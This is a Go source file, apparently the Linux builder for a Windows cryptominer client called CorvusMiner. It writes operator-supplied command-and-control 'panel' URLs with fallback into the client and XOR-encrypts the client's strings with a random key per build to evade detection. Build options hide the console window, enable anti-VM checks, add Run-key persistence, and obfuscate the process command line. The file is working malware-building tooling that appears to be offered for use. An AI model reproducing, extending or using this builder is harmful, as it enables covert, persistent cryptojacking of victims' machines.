package main

import (
	"bufio"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// Linux builder - cross-compiles for Windows using MinGW on Linux

func init() {
	if runtime.GOOS != "linux" {
		logError("This builder only works on Linux. Use build.sh instead.")
		os.Exit(1)
	}
	clientDir = "./Client"
	buildDir = filepath.Join(clientDir, "build")
}

// checkDependencies verifies MinGW and build tools are installed
func checkDependencies() error {
	logInfo("Checking dependencies...")

	deps := []string{
		"cmake",
		"make",
		"x86_64-w64-mingw32-gcc",
		"x86_64-w64-mingw32-g++",
	}

	for _, dep := range deps {
		cmd := exec.Command("which", dep)
		if err := cmd.Run(); err != nil {
			logError("%s not found. Install with: sudo apt install mingw-w64 cmake make", dep)
			return err
		}
	}

	logInfo("All dependencies found")
	return nil
}

// buildClientNonInteractive builds using command-line flags
func buildClientNonInteractive() error {
	logInfo("CorvusMiner Builder - Non-Interactive Mode")

	// Check dependencies first
	if err := checkDependencies(); err != nil {
		return fmt.Errorf("dependency check failed: %v", err)
	}

	panelURL := *panelURLFlag
	processMonitoring := *monitoringFlag
	debugConsole := *debugFlag
	antiVM := *antiVMFlag
	persistence := *persistenceFlag

	urlCount := len(strings.Split(panelURL, ","))
	logInfo("Using %d panel URL(s) with fallback support", urlCount)

	logInfo("Configuration:")
	logInfo("  Panel URL: %s", panelURL)
	logInfo("  Process Monitoring: %v", processMonitoring)
	logInfo("  Debug Console: %v", debugConsole)
	logInfo("  Anti-VM Detection: %v", antiVM)
	logInfo("  Persistence: %v", persistence)

	return executeBuild(panelURL, processMonitoring, debugConsole, antiVM, persistence)
}

// buildClientLinux orchestrates the full build pipeline for Linux
func buildClientLinux() error {
	logInfo("CorvusMiner Builder - Linux Version")

	// Check dependencies first
	if err := checkDependencies(); err != nil {
		return fmt.Errorf("dependency check failed: %v", err)
	}

	// Get panel URL(s) from user
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter panel URL(s) separated by commas for fallback (e.g., http://panel1.com/api,http://panel2.com/api): ")
	panelURL, _ := reader.ReadString('\n')
	panelURL = strings.TrimSpace(panelURL)

	if panelURL == "" {
		return fmt.Errorf("panel URL cannot be empty")
	}

	// Validate URLs
	urlCount := len(strings.Split(panelURL, ","))
	logInfo("Using %d panel URL(s) with fallback support", urlCount)

	// Get monitoring preference
	fmt.Print("Enable process monitoring and command-line obfuscation? (y/n): ")
	monitorInput, _ := reader.ReadString('\n')
	processMonitoring := strings.TrimSpace(monitorInput) == "y"

	// Get debug console preference
	fmt.Print("Enable debug console? (y/n): ")
	debugInput, _ := reader.ReadString('\n')
	debugConsole := strings.TrimSpace(debugInput) == "y"

	// Get anti-VM preference
	fmt.Print("Enable anti-VM detection? (y/n): ")
	antiVMInput, _ := reader.ReadString('\n')
	antiVM := strings.TrimSpace(antiVMInput) == "y"

	// Get persistence preference
	fmt.Print("Enable persistence (Run key)? (y/n): ")
	persistenceInput, _ := reader.ReadString('\n')
	persistence := strings.TrimSpace(persistenceInput) == "y"

	logInfo("Configuration:")
	logInfo("  Panel URL: %s", panelURL)
	logInfo("  Process Monitoring: %v", processMonitoring)
	logInfo("  Debug Console: %v", debugConsole)
	logInfo("  Anti-VM Detection: %v", antiVM)
	logInfo("  Persistence: %v", persistence)

	return executeBuild(panelURL, processMonitoring, debugConsole, antiVM, persistence)
}

// executeBuild performs the actual build process
func executeBuild(panelURL string, processMonitoring, debugConsole, antiVM, persistence bool) error {
	// Backup source files
	backupDir := filepath.Join(clientDir, "backup")
	logInfo("Backing up source files to %s", backupDir)
	if err := backupSourceFiles(backupDir); err != nil {
		return fmt.Errorf("backup failed: %v", err)
	}
	defer func() {
		if err := restoreSourceFiles(backupDir); err != nil {
			logError("Failed to restore source files: %v", err)
		}
	}()

	// Generate XOR key
	xorKey := generateXORKey(32)
	logInfo("Generated XOR key (base64): %s", xorKey)

	// Inject encryption key into header
	if err := injectEncryptionKey(xorKey); err != nil {
		return fmt.Errorf("failed to inject encryption key: %v", err)
	}

	// Modify panel URL BEFORE encryption
	srcFile := filepath.Join(clientDir, "src", "main.cpp")
	logInfo("Setting panel URL to: %s", panelURL)
	if err := modifyPanelURL(srcFile, panelURL); err != nil {
		return fmt.Errorf("failed to modify panel URL: %v", err)
	}

	// Decode key for string encryption
	keyBytes, err := base64.StdEncoding.DecodeString(xorKey)
	if err != nil {
		return fmt.Errorf("failed to decode XOR key: %v", err)
	}

	// Encrypt strings in source files (including the modified panel URL)
	logInfo("Encrypting strings in source files...")
	if err := encryptSourceStrings(keyBytes); err != nil {
		return fmt.Errorf("string encryption failed: %v", err)
	}

	// DEBUG: Verify the file was actually modified
	debugContent, _ := os.ReadFile(filepath.Join(clientDir, "src", "main.cpp"))
	debugStr := string(debugContent)
	if strings.Contains(debugStr, "DecryptString(__ENCRYPTED_") {
		logInfo("✓ VERIFIED: main.cpp contains DecryptString calls")
	} else {
		logError("✗ WARNING: main.cpp does NOT contain DecryptString calls!")
		logError("First 500 chars: %s", debugStr[:min(500, len(debugStr))])
	}

	// Toggle WIN32 flag for debug console
	if debugConsole {
		logInfo("Enabling debug console...")
	} else {
		logInfo("Disabling debug console (hiding window)...")
	}
	if err := toggleWin32Flag(debugConsole); err != nil {
		return fmt.Errorf("failed to toggle WIN32 flag: %v", err)
	}

	// Clean build directory
	os.RemoveAll(buildDir)
	os.MkdirAll(buildDir, 0755)

	// Run CMake
	logInfo("Configuring project with CMake...")
	if err := runCMakeLinux(antiVM, persistence); err != nil {
		return fmt.Errorf("CMake configuration failed: %v", err)
	}

	// Run make
	logInfo("Building project...")
	if err := runMakeLinux(); err != nil {
		return fmt.Errorf("build failed: %v", err)
	}

	logSuccess("Build completed successfully!")
	logInfo("Output: %s/corvus.exe", buildDir)

	// If output flag is set, copy binary to specified location
	if *outputFlag != "" {
		srcBinary := filepath.Join(buildDir, "corvus.exe")
		dstBinary := filepath.Join(*outputFlag, "corvus.exe")

		// Create output directory if it doesn't exist
		if err := os.MkdirAll(*outputFlag, 0755); err != nil {
			return fmt.Errorf("failed to create output directory: %v", err)
		}

		// Copy binary
		if err := copyFile(srcBinary, dstBinary); err != nil {
			return fmt.Errorf("failed to copy binary to output: %v", err)
		}

		logSuccess("Binary copied to: %s", dstBinary)
	}

	return nil
}

// runCMakeLinux runs CMake for Linux cross-compilation
func runCMakeLinux(antiVM bool, persistence bool) error {
	args := []string{
		"-DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc",
		"-DCMAKE_CXX_COMPILER=x86_64-w64-mingw32-g++",
		"-DCMAKE_BUILD_TYPE=Release",
		"-G", "Unix Makefiles",
	}

	if antiVM {
		args = append(args, "-DENABLE_ANTIVM=ON")
	}

	if persistence {
		args = append(args, "-DENABLE_PERSISTENCE=ON")
	}

	args = append(args, "..")

	cmd := exec.Command("cmake", args...)

	cmd.Dir = buildDir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	logInfo("Running CMake in %s", buildDir)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("cmake error: %v", err)
	}

	return nil
}

// runMakeLinux runs make for Linux
func runMakeLinux() error {
	numCores := runtime.NumCPU()
	if numCores > 2 {
		numCores = 2 // Don't overload
	}

	cmd := exec.Command("make", fmt.Sprintf("-j%d", numCores))
	cmd.Dir = buildDir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	logInfo("Running make with %d cores", numCores)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("make error: %v", err)
	}

	return nil
}

// modifyPanelURL updates the panel URL in main.cpp BEFORE encryption
func modifyPanelURL(filename, newURL string) error {
	content, err := os.ReadFile(filename)
	if err != nil {
		return fmt.Errorf("failed to read file %s: %w", filename, err)
	}

	contentStr := string(content)

	// Find the ENCRYPT_STR pattern in main.cpp
	// Pattern: ENCRYPT_STR("http://...")
	startMarker := `ENCRYPT_STR("`
	startIdx := strings.Index(contentStr, startMarker)
	if startIdx == -1 {
		logError("Could not find '%s' in %s", startMarker, filename)
		logError("File content preview (first 500 chars): %s", contentStr[:min(500, len(contentStr))])
		return fmt.Errorf("could not find ENCRYPT_STR pattern for panel URL in main.cpp")
	}

	// Find the opening quote
	quoteStart := startIdx + len(startMarker) - 1 // -1 to include the quote

	// Find the closing quote (handle escapes)
	quoteEnd := quoteStart + 1
	for quoteEnd < len(contentStr) {
		if contentStr[quoteEnd] == '\\' {
			quoteEnd += 2 // Skip escaped character
			continue
		}
		if contentStr[quoteEnd] == '"' {
			break
		}
		quoteEnd++
	}

	if quoteEnd >= len(contentStr) {
		return fmt.Errorf("could not find closing quote for panel URL")
	}

	// Replace the old URL with the new one
	before := contentStr[:quoteStart+1] // Include opening quote
	after := contentStr[quoteEnd:]      // Include closing quote onwards
	contentStr = before + newURL + after

	return os.WriteFile(filename, []byte(contentStr), 0644)
}

// toggleWin32Flag toggles the WIN32 flag in CMakeLists.txt
// When enableDebugConsole is true, we comment out WIN32 and -mwindows to show console
// When enableDebugConsole is false, we uncomment WIN32 and -mwindows to hide console
func toggleWin32Flag(enableDebugConsole bool) error {
	cmakePath := filepath.Join(clientDir, "CMakeLists.txt")
	content, err := os.ReadFile(cmakePath)
	if err != nil {
		return err
	}

	contentStr := string(content)

	// Use regex to handle both cases properly
	if enableDebugConsole {
		// Debug enabled: Comment out WIN32 and -mwindows to show console
		contentStr = strings.ReplaceAll(contentStr, "    WIN32", "    #WIN32")
		contentStr = strings.ReplaceAll(contentStr, "    LINK_FLAGS \"-mwindows\"", "    #LINK_FLAGS \"-mwindows\"")
	} else {
		// Debug disabled: Uncomment WIN32 and -mwindows to hide console
		contentStr = strings.ReplaceAll(contentStr, "    #WIN32", "    WIN32")
		contentStr = strings.ReplaceAll(contentStr, "    #LINK_FLAGS \"-mwindows\"", "    LINK_FLAGS \"-mwindows\"")
	}

	return os.WriteFile(cmakePath, []byte(contentStr), 0644)
}

// generateXORKey generates a random XOR key and returns it as base64
func generateXORKey(length int) string {
	key := make([]byte, length)
	rand.Read(key)
	return base64.StdEncoding.EncodeToString(key)
}

// injectEncryptionKey injects the XOR key into encryption.h
func injectEncryptionKey(b64Key string) error {
	encryptionHeaderPath := filepath.Join(clientDir, "include", "encryption.h")

	content, err := os.ReadFile(encryptionHeaderPath)
	if err != nil {
		logError("Failed to read encryption.h: %v", err)
		return err
	}

	contentStr := string(content)

	// Replace: const std::string ENCRYPTION_KEY_B64 = "";
	// With:    const std::string ENCRYPTION_KEY_B64 = "BASE64_KEY";
	oldPattern := `const std::string ENCRYPTION_KEY_B64 = "";`
	newPattern := fmt.Sprintf(`const std::string ENCRYPTION_KEY_B64 = "%s";`, b64Key)

	if strings.Contains(contentStr, oldPattern) {
		contentStr = strings.ReplaceAll(contentStr, oldPattern, newPattern)
		logInfo("Injected XOR key into encryption.h")
	} else {
		logError("Could not find ENCRYPTION_KEY_B64 pattern in encryption.h")
		return fmt.Errorf("encryption key pattern not found")
	}

	return os.WriteFile(encryptionHeaderPath, []byte(contentStr), 0644)
}

// encryptSourceStrings finds and encrypts ENCRYPT_STR calls and fills placeholders
func encryptSourceStrings(keyBytes []byte) error {
	const maxPlaceholders = 16
	encryptedValues := []string{}

	srcDir := filepath.Join(clientDir, "src")
	entries, err := os.ReadDir(srcDir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		name := entry.Name()
		if !strings.HasSuffix(name, ".cpp") && !strings.HasSuffix(name, ".h") {
			continue
		}

		filePath := filepath.Join(srcDir, name)
		if err := encryptStringsInFile(filePath, keyBytes, &encryptedValues, maxPlaceholders); err != nil {
			return fmt.Errorf("failed to encrypt %s: %w", filePath, err)
		}
	}

	if err := injectEncryptedPlaceholders(encryptedValues); err != nil {
		return err
	}

	return nil
}

// encryptStringsInFile encrypts ENCRYPT_STR calls in a file and stores the encrypted values
func encryptStringsInFile(filePath string, keyBytes []byte, encryptedValues *[]string, maxPlaceholders int) error {
	content, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	contentStr := string(content)
	modified := contentStr
	encryptionCount := 0

	// Find and encrypt all ENCRYPT_STR("...") calls
	// Pattern: ENCRYPT_STR("...") where ... is the string to encrypt

	for {
		// Look for ENCRYPT_STR(
		startIdx := strings.Index(modified, "ENCRYPT_STR(")
		if startIdx == -1 {
			break
		}

		// Find the opening quote after ENCRYPT_STR(
		quoteStart := startIdx + len("ENCRYPT_STR(")

		// Skip any whitespace
		for quoteStart < len(modified) && (modified[quoteStart] == ' ' || modified[quoteStart] == '\t') {
			quoteStart++
		}

		// Must have a quote
		if quoteStart >= len(modified) || modified[quoteStart] != '"' {
			break
		}

		// Find the closing quote (handle escapes)
		quoteEnd := quoteStart + 1
		for quoteEnd < len(modified) {
			if modified[quoteEnd] == '\\' {
				quoteEnd += 2 // Skip escaped character
				continue
			}
			if modified[quoteEnd] == '"' {
				break
			}
			quoteEnd++
		}

		if quoteEnd >= len(modified) {
			break
		}

		// Extract the plaintext string (without quotes)
		plaintext := modified[quoteStart+1 : quoteEnd]

		// Encrypt it
		ciphertext := make([]byte, len(plaintext))
		for i := 0; i < len(plaintext); i++ {
			ciphertext[i] = plaintext[i] ^ keyBytes[i%len(keyBytes)]
		}

		// Encode to base64
		b64Encrypted := base64.StdEncoding.EncodeToString(ciphertext)

		// Append to placeholder list
		*encryptedValues = append(*encryptedValues, b64Encrypted)
		placeholderIdx := len(*encryptedValues) - 1
		if placeholderIdx >= maxPlaceholders {
			return fmt.Errorf("not enough encrypted placeholders (max %d)", maxPlaceholders)
		}

		// Create the replacement: DecryptString(__ENCRYPTED_N__)
		replacement := fmt.Sprintf(`DecryptString(__ENCRYPTED_%d__)`, placeholderIdx)

		// Find the closing parenthesis of ENCRYPT_STR(...)
		closeParenIdx := quoteEnd + 1
		for closeParenIdx < len(modified) && (modified[closeParenIdx] == ' ' || modified[closeParenIdx] == '\t') {
			closeParenIdx++
		}

		if closeParenIdx >= len(modified) || modified[closeParenIdx] != ')' {
			break
		}

		// Replace ENCRYPT_STR("plaintext") with DecryptStringBase64("base64")
		before := modified[:startIdx]
		after := modified[closeParenIdx+1:]
		modified = before + replacement + after

		encryptionCount++

		// Log the encryption
		displayStr := plaintext
		if len(displayStr) > 30 {
			displayStr = displayStr[:30] + "..."
		}
		displayB64 := b64Encrypted
		if len(displayB64) > 40 {
			displayB64 = displayB64[:40] + "..."
		}
		logInfo("✓ Encrypted: %s -> %s", displayStr, displayB64)
	}

	// Only write back if we made changes
	if encryptionCount > 0 {
		logInfo("Encrypted %d strings in %s", encryptionCount, filepath.Base(filePath))
		logInfo("Writing modified file back to: %s", filePath)
		if err := os.WriteFile(filePath, []byte(modified), 0644); err != nil {
			return err
		}
		logInfo("Successfully wrote modified file")
	}

	return nil
}

// injectEncryptedPlaceholders writes the encrypted base64 strings into encryption.h placeholders
func injectEncryptedPlaceholders(values []string) error {
	encryptionHeaderPath := filepath.Join(clientDir, "include", "encryption.h")
	content, err := os.ReadFile(encryptionHeaderPath)
	if err != nil {
		return fmt.Errorf("failed to read encryption.h: %w", err)
	}

	contentStr := string(content)
	for i, val := range values {
		old := fmt.Sprintf(`const char __ENCRYPTED_%d__[] = "";`, i)
		newStr := fmt.Sprintf(`const char __ENCRYPTED_%d__[] = "%s";`, i, val)
		if strings.Contains(contentStr, old) {
			contentStr = strings.ReplaceAll(contentStr, old, newStr)
		} else {
			return fmt.Errorf("placeholder __ENCRYPTED_%d__ not found", i)
		}
	}

	if err := os.WriteFile(encryptionHeaderPath, []byte(contentStr), 0644); err != nil {
		return fmt.Errorf("failed to write encryption.h: %w", err)
	}

	logInfo("Injected %d encrypted strings into encryption.h", len(values))
	return nil
}

// backupSourceFiles backs up source files
func backupSourceFiles(backupDirPath string) error {
	os.RemoveAll(backupDirPath)

	srcDir := filepath.Join(clientDir, "src")
	includeDir := filepath.Join(clientDir, "include")

	if err := copyDirRecursive(srcDir, filepath.Join(backupDirPath, "src")); err != nil {
		return err
	}

	if err := copyDirRecursive(includeDir, filepath.Join(backupDirPath, "include")); err != nil {
		return err
	}

	return nil
}

// copyDirRecursive recursively copies a directory
func copyDirRecursive(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			if err := copyDirRecursive(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			data, err := os.ReadFile(srcPath)
			if err != nil {
				return err
			}
			if err := os.WriteFile(dstPath, data, 0644); err != nil {
				return err
			}
		}
	}

	return nil
}

// restoreSourceFiles restores files from backup
func restoreSourceFiles(backupDirPath string) error {
	srcDir := filepath.Join(clientDir, "src")
	includeDir := filepath.Join(clientDir, "include")

	if err := restoreDirRecursive(filepath.Join(backupDirPath, "src"), srcDir); err != nil {
		// Ignore if backup doesn't exist
	}

	if err := restoreDirRecursive(filepath.Join(backupDirPath, "include"), includeDir); err != nil {
		// Ignore if backup doesn't exist
	}

	return nil
}

// restoreDirRecursive recursively restores a directory from backup
func restoreDirRecursive(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			if err := restoreDirRecursive(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			data, err := os.ReadFile(srcPath)
			if err != nil {
				return err
			}
			if err := os.WriteFile(dstPath, data, 0644); err != nil {
				return err
			}
		}
	}

	return nil
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0644)
}

// linuxMain is the main entry point for Linux builds
func linuxMain() {
	if err := buildClientLinux(); err != nil {
		logError("Build failed: %v", err)
		os.Exit(1)
	}
}
